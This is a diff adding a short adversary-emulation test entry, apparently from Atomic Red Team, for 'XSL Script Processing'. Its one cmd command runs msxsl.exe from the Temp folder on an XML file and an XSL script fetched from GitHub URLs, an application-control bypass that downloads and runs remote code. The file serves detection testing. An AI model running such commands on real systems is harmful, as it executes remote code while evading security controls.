@@ -1,0 +1,7 @@
+#TechniqueName: XSL Script Processing
+#AtomicTestName: MSXSL Bypass using remote files
+#Language: cmd
+
+#commands
+C:\Windows\Temp\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+
